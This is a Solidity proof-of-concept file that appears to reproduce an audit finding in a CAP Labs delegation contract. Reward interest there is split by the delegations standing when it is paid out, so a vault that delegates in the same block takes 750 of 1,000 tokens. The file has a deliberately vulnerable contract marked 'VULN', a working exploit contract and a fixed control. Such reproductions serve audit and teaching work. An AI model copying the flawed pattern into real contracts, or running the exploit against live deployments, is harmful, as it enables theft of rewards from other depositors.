// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  CAP Labs Delegation — repayment rewards are split by the delegation that
    exists at that moment (Trail of Bits / Benjamin Samuels, finding #61538,
    May 2025).

    SYNTHETIC, cheatcode-free, one block. Vault A already backs the agent
    with 100. Interest of 1000 RWD sits on the delegation contract. Vault B
    delegates 300 and then distribute() pays B 750 and A 250. Control freezes
    eligibility before the new deposit, so A receives the full 1000. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {}

contract Delegation {
    Token public reward;
    address[] public vaults;
    mapping(address => uint256) public delegated;
    uint256 public total;

    constructor(Token _reward) {
        reward = _reward;
    }

    function delegate(address vault, uint256 amount) external {
        if (delegated[vault] == 0) vaults.push(vault);
        delegated[vault] += amount;
        total += amount;
    }

    function distribute() external {
        uint256 pot = reward.balanceOf(address(this));
        uint256 base = total;
        for (uint256 i; i < vaults.length; i++) {
            address vault = vaults[i];
            // @> VULN: the share uses delegation at distribute time, including this block
            uint256 pay = pot * delegated[vault] / base;
            if (pay != 0) reward.transfer(vault, pay);
        }
    }
}

contract Exploit {
    uint256 public constant A_STAKE = 100 ether;
    uint256 public constant B_STAKE = 300 ether;
    uint256 public constant REWARD = 1000 ether;

    Token public reward;
    Delegation public delegation;
    Vault public vaultA;
    uint256 public paidB;
    uint256 public paidA;

    constructor() {
        reward = new Token("Reward", "RWD", 18);
        delegation = new Delegation(reward);
        vaultA = new Vault();
        delegation.delegate(address(vaultA), A_STAKE);
        reward.mint(address(delegation), REWARD);
    }

    function run() external {
        delegation.delegate(address(this), B_STAKE);
        delegation.distribute();
        paidB = reward.balanceOf(address(this));
        paidA = reward.balanceOf(address(vaultA));
        require(paidB == 750 ether, "B share");
        require(paidA == 250 ether, "A share");
    }
}

/// @dev Control: collateral added after the epoch is locked does not earn this interest.
contract DelegationFixed {
    Token public reward;
    bool public locked;
    mapping(address => uint256) public eligible;
    uint256 public eligibleTotal;

    constructor(Token _reward) {
        reward = _reward;
    }

    function delegate(address vault, uint256 amount) external {
        if (locked) return;
        eligible[vault] += amount;
        eligibleTotal += amount;
    }

    function lock() external {
        locked = true;
    }

    function distributeTo(address vault) external {
        uint256 pot = reward.balanceOf(address(this));
        uint256 pay = pot * eligible[vault] / eligibleTotal;
        if (pay != 0) reward.transfer(vault, pay);
    }
}
